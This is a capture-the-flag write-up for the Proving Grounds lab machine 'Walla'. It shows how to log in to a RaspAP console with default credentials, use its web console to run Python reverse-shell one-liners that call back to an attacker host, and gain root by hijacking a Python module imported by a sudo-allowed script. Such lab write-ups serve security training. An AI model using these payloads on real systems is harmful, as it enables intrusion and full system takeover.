# Walla — Proving Grounds

> [!abstract] Summary
> Walla exposes a **RaspAP** web console (lighttpd, port 8091) behind HTTP Basic auth that accepts the default credentials **`admin:secret`**. RaspAP's built-in system console runs OS commands, which is used to drop a reverse shell as **`www-data`**. `sudo -l` shows `www-data` can run `/usr/bin/python /home/walter/wifi_reset.py` as root; the script's directory is writable, so planting a malicious `wificontroller.py` module (imported by the script) — or replacing the script outright — executes our code as **root**.

**Target:** `192.168.142.97`

## Methodology

1. Scan all TCP ports; identify the RaspAP console on 8091.
2. Log in with default credentials `admin:secret`.
3. Use the RaspAP console to get a reverse shell as `www-data`.
4. Abuse the `sudo` Python `wifi_reset.py` via a hijacked import module (or script replacement) for root.

## Initial access — RaspAP default credentials + console

Browse `http://192.168.142.97:8091/` → HTTP Basic prompt for realm **RaspAP**. RaspAP ships with default credentials:

```
admin : secret
```

Once logged in, RaspAP has a built-in **System → Console** (web console) that executes OS commands. Start a listener on Kali:

```
nc -lvnp <PORT>
```

Run a reverse shell from the RaspAP console (a Python/bash one-liner from revshells.com with your Kali IP/port). The console hits the endpoint and the callback lands as **`www-data`**:

```
# in the RaspAP console (System → Console / includes/webconsole.php)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<KALI_IP>",<PORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];import pty;pty.spawn("/bin/bash")'
```

Grab the user flag from `walter`'s home directory.

## Privilege escalation — `sudo python wifi_reset.py`

As `www-data`, check `sudo -l`:

```
User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
```

Read the script — it imports a module and calls it:

```python
#!/usr/bin/python
import sys
try:
        import wificontroller
except Exception:
        print "[!] ERROR: Unable to load wificontroller module."
        sys.exit()
wificontroller.stop("wlan0", "1")
wificontroller.reset("wlan0", "1")
wificontroller.start("wlan0", "1")
```

The script itself is **not** writable, but `/home/walter/` **is** writable by `www-data`.

> [!info] Python module-import hijack
> When Python runs a script, the script's own directory is first on `sys.path`. `wifi_reset.py` does `import wificontroller`, which Python resolves from `/home/walter/` *before* the system paths. By dropping our own `wificontroller.py` there, our code runs at import time — as **root**, because the sudo rule runs the script as root.

### Technique A — module hijack (recommended)

```
cd /home/walter
cat > wificontroller.py <<'EOF'
import os
os.system("/bin/bash")
EOF
sudo /usr/bin/python /home/walter/wifi_reset.py
```

The `import wificontroller` triggers `os.system("/bin/bash")` as root → root shell. (A SUID variant: `os.system("chmod u+s /bin/bash")` then `/bin/bash -p`.)

### Technique B — replace the script

If `/home/walter/wifi_reset.py` is removable, overwrite it with a reverse shell and run it under sudo:

```
rm /home/walter/wifi_reset.py
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")' > /home/walter/wifi_reset.py
sudo /usr/bin/python /home/walter/wifi_reset.py
```

Either way you land a root shell — read `/root/proof.txt`.

> [!note] linPEAS also flags write access to `/lib/systemd/system/raspapd.service`, an alternative root path (overwrite the unit's `ExecStart` and restart/reboot). The `wifi_reset.py` route is cleaner and immediate.

## Lessons learned

- A `Basic realm=RaspAP` 401 is a fingerprint — appliances and panels (RaspAP, pfSense, Webmin…) ship with well-known default credentials. Try `admin:secret` before anything else.
- Admin panels with a "console"/"diagnostics" feature are command-exec primitives; use them to get a reverse shell directly.
- For `sudo`-allowed Python scripts, you don't need to write the script — if its **directory** is writable, hijack one of its `import`s. Python's `sys.path[0]` is the script's directory.
- Don't stop at the first privesc you find — note alternatives (writable `raspapd.service`) in case the primary one is patched on your instance.
